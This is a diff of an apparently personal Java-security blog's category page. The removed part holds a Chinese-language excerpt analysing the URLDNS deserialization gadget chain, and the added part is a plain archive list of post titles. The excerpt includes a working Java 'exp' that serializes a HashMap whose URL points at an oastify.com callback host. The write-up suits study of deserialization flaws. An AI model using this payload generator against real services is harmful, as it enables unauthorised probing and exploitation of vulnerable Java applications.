@@ -604,197 +604,130 @@
 	
 
 	
-	<div class="custom-category-container">
+	<div class="custom-category-container shadow-none hover:shadow-none sm:shadow-redefine sm:hover:shadow-redefine-hover">
     <h1 class="page-title-header">
         JAVA安全
     </h1>
-    <div class="custom-category-content">
-        <div class="article-list">
-            
-            <article class="article-item">
-                <div class="article-meta">
-                    <time class="article-date" datetime="2025-03-03T08:18:27.000Z">
-                        2025-03-03
-                    </time>
-                </div>
-                <h2 class="article-title">
-                    <a href="/2025/03/03/CC1_TransformedMap/">CC1_TransformedMap</a>
-                </h2>
-                
-            </article>
-            
-            <article class="article-item">
-                <div class="article-meta">
-                    <time class="article-date" datetime="2025-03-03T09:21:01.000Z">
-                        2025-03-03
-                    </time>
-                </div>
-                <h2 class="article-title">
-                    <a href="/2025/03/03/CC1_LazyMap/">CC1_LazyMap</a>
-                </h2>
-                
-            </article>
-            
-            <article class="article-item">
-                <div class="article-meta">
-                    <time class="article-date" datetime="2025-03-04T09:43:36.000Z">
-                        2025-03-04
-                    </time>
-                </div>
-                <h2 class="article-title">
-                    <a href="/2025/03/04/CC2/">CC2</a>
-                </h2>
-                
-            </article>
-            
-            <article class="article-item">
-                <div class="article-meta">
-                    <time class="article-date" datetime="2025-03-04T06:14:29.000Z">
-                        2025-03-04
-                    </time>
-                </div>
-                <h2 class="article-title">
-                    <a href="/2025/03/04/CC3/">CC3</a>
-                </h2>
-                
-            </article>
-            
-            <article class="article-item">
-                <div class="article-meta">
-                    <time class="article-date" datetime="2025-03-04T07:49:49.000Z">
-                        2025-03-04
-                    </time>
-                </div>
-                <h2 class="article-title">
-                    <a href="/2025/03/04/CC4/">CC4</a>
-                </h2>
-                
-            </article>
-            
-            <article class="article-item">
-                <div class="article-meta">
-                    <time class="article-date" datetime="2025-03-04T11:25:15.000Z">
-                        2025-03-04
-                    </time>
-                </div>
-                <h2 class="article-title">
-                    <a href="/2025/03/04/CC5/">CC5</a>
-                </h2>
-                
-            </article>
-            
-            <article class="article-item">
-                <div class="article-meta">
-                    <time class="article-date" datetime="2025-03-05T09:06:59.000Z">
-                        2025-03-05
-                    </time>
-                </div>
-                <h2 class="article-title">
-                    <a href="/2025/03/05/CC7/">CC7</a>
-                </h2>
-                
-            </article>
-            
-            <article class="article-item">
-                <div class="article-meta">
-                    <time class="article-date" datetime="2025-03-14T06:05:38.000Z">
-                        2025-03-14
-                    </time>
-                </div>
-                <h2 class="article-title">
-                    <a href="/2025/03/14/Shiro550/">Shiro550</a>
-                </h2>
-                
-            </article>
-            
-            <article class="article-item">
-                <div class="article-meta">
-                    <time class="article-date" datetime="2025-03-25T12:53:01.000Z">
-                        2025-03-25
-                    </time>
-                </div>
-                <h2 class="article-title">
-                    <a href="/2025/03/25/RMI%E5%9F%BA%E7%A1%80/">RMI基础</a>
-                </h2>
-                
-            </article>
-            
-            <article class="article-item">
-                <div class="article-meta">
-                    <time class="article-date" datetime="2025-02-28T13:35:20.000Z">
-                        2025-02-28
-                    </time>
-                </div>
-                <h2 class="article-title">
-                    <a href="/2025/02/28/URLDNS/">URLDNS</a>
-                </h2>
-                
-                <div class="article-excerpt">
-                    <h2 id="思考过程："><a href="#思考过程：" class="headerlink" title="思考过程："></a>思考过程：</h2><ol>
-<li><font style="color:#DF2A3F;">java.util.HashMap</font>重写了 <font style="color:#DF2A3F;">readObject</font>, 在反序列化时会调用<font style="color:#DF2A3F;">hash</font>函数计算 key 的<font style="color:#DF2A3F;">hashCode</font></li>
-<li><font style="color:#DF2A3F;">java.net.URL</font>的<font style="color:#DF2A3F;">hashCode</font>在计算时会调用 <font style="color:#DF2A3F;">getHostAddress</font>来解析域名, 从而发出 DNS 请求.</li>
-</ol>
-<p>先看<font style="color:#DF2A3F;">hashMap.readObject()</font></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_ invoke__">readObject</span>(java.io.ObjectInputStream s)</span><br><span class="line">        throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.<span class="title function_ invoke__">defaultReadObject</span>();</span><br><span class="line">        <span class="title function_ invoke__">reinitialize</span>();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.<span class="title function_ invoke__">isNaN</span>(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        s.<span class="title function_ invoke__">readInt</span>();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="keyword">int</span> mappings = s.<span class="title function_ invoke__">readInt</span>(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                             mappings);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">            <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">            <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">            <span class="keyword">float</span> lf = Math.<span class="title function_ invoke__">min</span>(Math.<span class="title function_ invoke__">max</span>(<span class="number">0.25</span>f, loadFactor), <span class="number">4.0</span>f);</span><br><span class="line">            <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0</span>f;</span><br><span class="line">            <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       <span class="title function_ invoke__">tableSizeFor</span>((<span class="keyword">int</span>)fc));</span><br><span class="line">            <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">            <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">            SharedSecrets.<span class="title function_ invoke__">getJavaOISAccess</span>().<span class="title function_ invoke__">checkArray</span>(s, Map.Entry[].<span class="keyword">class</span>, cap);</span><br><span class="line">            @<span class="title function_ invoke__">SuppressWarnings</span>(&#123;<span class="string">&quot;rawtypes&quot;</span>,<span class="string">&quot;unchecked&quot;</span>&#125;)</span><br><span class="line">                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                @<span class="title function_ invoke__">SuppressWarnings</span>(<span class="string">&quot;unchecked&quot;</span>)</span><br><span class="line">                    K key = (K) s.<span class="title function_ invoke__">readObject</span>();</span><br><span class="line">                @<span class="title function_ invoke__">SuppressWarnings</span>(<span class="string">&quot;unchecked&quot;</span>)</span><br><span class="line">                    V value = (V) s.<span class="title function_ invoke__">readObject</span>();</span><br><span class="line">                <span class="title function_ invoke__">putVal</span>(<span class="title function_ invoke__">hash</span>(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>注意最后的<font style="color:#DF2A3F;">putVal</font>使用了<font style="color:#DF2A3F;">hash(key)</font><font style="color:#000000;">，跟进hash()</font></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title function_ invoke__">hash</span>(Object key) &#123;</span><br><span class="line">        <span class="keyword">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.<span class="title function_ invoke__">hashCode</span>()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里使用了一个<font style="color:#DF2A3F;">hashCode()</font>处理<font style="color:#DF2A3F;">key</font>，此时的key可以是我们传入的URL类的实例，跟进URL.hashCode()</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> synchronized <span class="keyword">int</span> <span class="title function_ invoke__">hashCode</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = handler.<span class="title function_ invoke__">hashCode</span>(this);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>当<font style="color:#DF2A3F;">hashCode</font>等于<font style="color:#DF2A3F;">-1</font>时会进入<font style="color:#DF2A3F;">handler.hashCode(this)</font>计算，跟进<font style="color:#DF2A3F;">handler</font></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transient URLStreamHandler handler; <span class="comment">// transient 关键字，修饰Java序列化对象时，不需要序列化的属性</span></span><br></pre></td></tr></table></figure>
-
-<p>发现有一个<font style="color:#DF2A3F;">URLStreamHandler</font><font style="color:#000000;">，跟进去看看找它的</font><font style="color:#DF2A3F;">hashCode</font></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title function_ invoke__">hashCode</span>(URL u) &#123;</span><br><span class="line">        <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the protocol part.</span></span><br><span class="line">        String protocol = u.<span class="title function_ invoke__">getProtocol</span>();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">            h += protocol.<span class="title function_ invoke__">hashCode</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the host part.</span></span><br><span class="line">        InetAddress addr = <span class="title function_ invoke__">getHostAddress</span>(u);</span><br><span class="line">        <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">            h += addr.<span class="title function_ invoke__">hashCode</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String host = u.<span class="title function_ invoke__">getHost</span>();</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">                h += host.<span class="title function_ invoke__">toLowerCase</span>().<span class="title function_ invoke__">hashCode</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the file part.</span></span><br><span class="line">        String file = u.<span class="title function_ invoke__">getFile</span>();</span><br><span class="line">        <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">            h += file.<span class="title function_ invoke__">hashCode</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the port part.</span></span><br><span class="line">        <span class="keyword">if</span> (u.<span class="title function_ invoke__">getPort</span>() == -<span class="number">1</span>)</span><br><span class="line">            h += <span class="title function_ invoke__">getDefaultPort</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            h += u.<span class="title function_ invoke__">getPort</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the ref part.</span></span><br><span class="line">        String ref = u.<span class="title function_ invoke__">getRef</span>();</span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">            h += ref.<span class="title function_ invoke__">hashCode</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p><font style="color:#000000;">出现</font><font style="color:#DF2A3F;">getHostAddress(u)</font><font style="color:#000000;">此处会进行DNS查询</font></p>
-<p>回到<font style="color:#DF2A3F;">Hashmap.readObject()</font></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                @<span class="title function_ invoke__">SuppressWarnings</span>(<span class="string">&quot;unchecked&quot;</span>)</span><br><span class="line">                    K key = (K) s.<span class="title function_ invoke__">readObject</span>();</span><br><span class="line">                @<span class="title function_ invoke__">SuppressWarnings</span>(<span class="string">&quot;unchecked&quot;</span>)</span><br><span class="line">                    V value = (V) s.<span class="title function_ invoke__">readObject</span>();</span><br><span class="line">                <span class="title function_ invoke__">putVal</span>(<span class="title function_ invoke__">hash</span>(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
-
-<p>此处有个<font style="color:#DF2A3F;">key</font>说明在writeObject()时会传入这个<font style="color:#DF2A3F;">key</font>，跟到writeObject()</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_ invoke__">writeObject</span>(java.io.ObjectOutputStream s)</span><br><span class="line">        throws IOException &#123;</span><br><span class="line">        <span class="keyword">int</span> buckets = <span class="title function_ invoke__">capacity</span>();</span><br><span class="line">        <span class="comment">// Write out the threshold, loadfactor, and any hidden stuff</span></span><br><span class="line">        s.<span class="title function_ invoke__">defaultWriteObject</span>();</span><br><span class="line">        s.<span class="title function_ invoke__">writeInt</span>(buckets);</span><br><span class="line">        s.<span class="title function_ invoke__">writeInt</span>(size);</span><br><span class="line">        <span class="title function_ invoke__">internalWriteEntries</span>(s);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>看到有一个<font style="color:#DF2A3F;">internalWriteEntries(s)</font><font style="color:#000000;">，接着跟进去看这个方法</font></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">internalWriteEntries</span>(java.io.ObjectOutputStream s) throws IOException &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab;</span><br><span class="line">        <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; (tab = table) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tab.length; ++i) &#123;</span><br><span class="line">                <span class="keyword">for</span> (Node&lt;K,V&gt; e = tab[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">                    s.<span class="title function_ invoke__">writeObject</span>(e.key);</span><br><span class="line">                    s.<span class="title function_ invoke__">writeObject</span>(e.value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>仔细看发现<font style="color:#DF2A3F;">key</font>是从<font style="color:#DF2A3F;">tab</font>中复制的，而<font style="color:#DF2A3F;">tab</font>的值即<font style="color:#DF2A3F;">HashMap</font>中<font style="color:#DF2A3F;">table</font>的值。</p>
-<p>想要修改<font style="color:#DF2A3F;">table</font>的值，就需要调用<font style="color:#DF2A3F;">HashMap.put()</font>方法<font style="color:#000000;">，跟进put方法</font></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_ invoke__">put</span>(K key, V value) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">putVal</span>(<span class="title function_ invoke__">hash</span>(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里同上的<font style="color:#DF2A3F;">putVal()</font><font style="color:#000000;">，使用</font><font style="color:#DF2A3F;">hash()</font><font style="color:#000000;">对key进行处理，即进行</font><font style="color:#DF2A3F;">URL.hashCode()</font><font style="color:#000000;">这里会触发DNS请求，为了避免这次请求影响结果，可以使用反射得到</font><font style="color:#DF2A3F;">URL</font><font style="color:#000000;">中</font><font style="color:#DF2A3F;">hashCode</font><font style="color:#000000;">属性的值</font>处理为<font style="color:#DF2A3F;">非-1</font>即可避免</p>
-<h2 id="链子执行："><a href="#链子执行：" class="headerlink" title="链子执行："></a>链子执行：</h2><p>反序列化hashMap后-&gt;hashMap.readObject()中的putVal()-&gt;hash(key)-&gt;key.hashCode()即URL.hashCode()-&gt;URLStreamHandler.hashCode()-&gt;getHostAddress()-&gt;触发DNS请求</p>
-<h2 id="链子构造："><a href="#链子构造：" class="headerlink" title="链子构造："></a>链子构造：</h2><ol>
-<li>使用<font style="color:#DF2A3F;">hashMap.put()</font><font style="color:#000000;">将</font><font style="color:#DF2A3F;">url</font><font style="color:#000000;">传入</font></li>
-<li><font style="color:#000000;">传入的</font><font style="color:#DF2A3F;">url</font><font style="color:#000000;">会被</font><font style="color:#DF2A3F;">putVal</font><font style="color:#000000;">进行</font><font style="color:#DF2A3F;">hash</font><font style="color:#000000;">处理，得到一个我们想要的</font><font style="color:#DF2A3F;">url.hashCode()</font></li>
-<li><font style="color:#DF2A3F;">url.hashCode()</font><font style="color:#000000;">此时被触发</font></li>
-<li><font style="color:#000000;">如果此时</font><font style="color:#DF2A3F;">url的hashCode属性</font><font style="color:#000000;">为</font><font style="color:#DF2A3F;">-1</font><font style="color:#000000;">当即会被触发一次</font><font style="color:#DF2A3F;">DNS请求</font></li>
-<li><font style="color:#000000;">为了避免此次请求我们利用反射先将</font><font style="color:#DF2A3F;">url的hashCode属性</font><font style="color:#000000;">先修改为</font><font style="color:#DF2A3F;">非-1</font></li>
-<li><font style="color:#000000;">等</font><font style="color:#DF2A3F;">put</font><font style="color:#000000;">执行结束后再改回</font><font style="color:#DF2A3F;">-1</font></li>
-<li><font style="color:#000000;">最后序列化这个</font><font style="color:#DF2A3F;">hashMap</font><font style="color:#000000;">实例</font></li>
-</ol>
-<p><font style="color:#000000;">攻击exp：</font></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package serializetest;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.concurrent.Callable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="keyword">void</span> <span class="title function_ invoke__">serialize</span>(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.<span class="title function_ invoke__">writeObject</span>(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="keyword">void</span> <span class="title function_ invoke__">main</span>(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        HashMap &lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        URL url = <span class="keyword">new</span> <span class="title function_ invoke__">URL</span>(<span class="string">&quot;http://d1fui1w35or3uk8e3m113tjdn4tvhm5b.oastify.com&quot;</span>);</span><br><span class="line">        <span class="comment">//getClass获取类</span></span><br><span class="line">        Class c = url.<span class="title function_ invoke__">getClass</span>();</span><br><span class="line">        <span class="comment">//getDeclareField获取hashCode属性</span></span><br><span class="line">        Field hashcodefield = c.<span class="title function_ invoke__">getDeclaredField</span>(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodefield.<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//当hashCode属性是-1时，会在序列化时激活DNS解析，所以先修改为1</span></span><br><span class="line">        hashcodefield.<span class="title function_ invoke__">set</span>(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//使用hashmap.put-&gt;调用hash-&gt;hash又使用了hashCode成功触发</span></span><br><span class="line">        hashmap.<span class="title function_ invoke__">put</span>(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//将hashCode的值改为-1，使程序正常执行hashCode</span></span><br><span class="line">        hashcodefield.<span class="title function_ invoke__">set</span>(url,-<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//最后序列化hsahmap</span></span><br><span class="line">        <span class="title function_ invoke__">serialize</span>(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/8916" >Java反序列化 — URLDNS利用链分析<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+    <div class="archive-list-container">
+        
+        
+            <section class="archive-item mb-spacing-unit last:mb-0">
+                <div class="archive-item-header flex flex-row items-center mb-2">
+                    <span class="archive-year font-semibold text-3xl mr-2">2025</span>
+                    <span class="archive-year-post-count text-xs md:text-sm font-bold rounded-small bg-third-background-color py-[2px] px-[10px] border border-border-color">11</span>
                 </div>
                 
-            </article>
-            
-            <article class="article-item">
-                <div class="article-meta">
-                    <time class="article-date" datetime="2025-03-03T13:48:18.000Z">
-                        2025-03-03
-                    </time>
-                </div>
-                <h2 class="article-title">
-                    <a href="/2025/03/03/CC6/">CC6</a>
-                </h2>
-                
-            </article>
-            
-        </div>
+                <ul class="article-list pl-0 md:pl-8 text-lg leading-[1.5]">
+                    
+                        
+                        
+                            
+                            <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='03-25'>
+                        
+                        <a href="/2025/03/25/RMI%E5%9F%BA%E7%A1%80/" class="block w-fit">
+                            <span class="article-title my-0.5 text-2xl">RMI基础</span>
+                        </a>
+                        
+                    
+                        
+                        
+                            
+                                </li>
+                            
+                            <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='03-14'>
+                        
+                        <a href="/2025/03/14/Shiro550/" class="block w-fit">
+                            <span class="article-title my-0.5 text-2xl">Shiro550</span>
+                        </a>
+                        
+                    
+                        
+                        
+                            
+                                </li>
+                            
+                            <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='03-05'>
+                        
+                        <a href="/2025/03/05/CC7/" class="block w-fit">
+                            <span class="article-title my-0.5 text-2xl">CC7</span>
+                        </a>
+                        
+                    
+                        
+                        
+                            
+                                </li>
+                            
+                            <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='03-04'>
+                        
+                        <a href="/2025/03/04/CC5/" class="block w-fit">
+                            <span class="article-title my-0.5 text-2xl">CC5</span>
+                        </a>
+                        
+                    
+                        
+                        
+                        <a href="/2025/03/04/CC2/" class="block w-fit">
+                            <span class="article-title my-0.5 text-2xl">CC2</span>
+                        </a>
+                        
+                    
+                        
+                        
+                        <a href="/2025/03/04/CC4/" class="block w-fit">
+                            <span class="article-title my-0.5 text-2xl">CC4</span>
+                        </a>
+                        
+                    
+                        
+                        
+                        <a href="/2025/03/04/CC3/" class="block w-fit">
+                            <span class="article-title my-0.5 text-2xl">CC3</span>
+                        </a>
+                        
+                    
+                        
+                        
+                            
+                                </li>
+                            
+                            <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='03-03'>
+                        
+                        <a href="/2025/03/03/CC6/" class="block w-fit">
+                            <span class="article-title my-0.5 text-2xl">CC6</span>
+                        </a>
+                        
+                    
+                        
+                        
+                        <a href="/2025/03/03/CC1_LazyMap/" class="block w-fit">
+                            <span class="article-title my-0.5 text-2xl">CC1_LazyMap</span>
+                        </a>
+                        
+                    
+                        
+                        
+                        <a href="/2025/03/03/CC1_TransformedMap/" class="block w-fit">
+                            <span class="article-title my-0.5 text-2xl">CC1_TransformedMap</span>
+                        </a>
+                        
+                    
+                        
+                        
+                            
+                                </li>
+                            
+                            <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='02-28'>
+                        
+                        <a href="/2025/02/28/URLDNS/" class="block w-fit">
+                            <span class="article-title my-0.5 text-2xl">URLDNS</span>
+                        </a>
+                        
+                    
+                    </li>
+                </ul>
+            </section>
+        
     </div>
 </div> 
 	
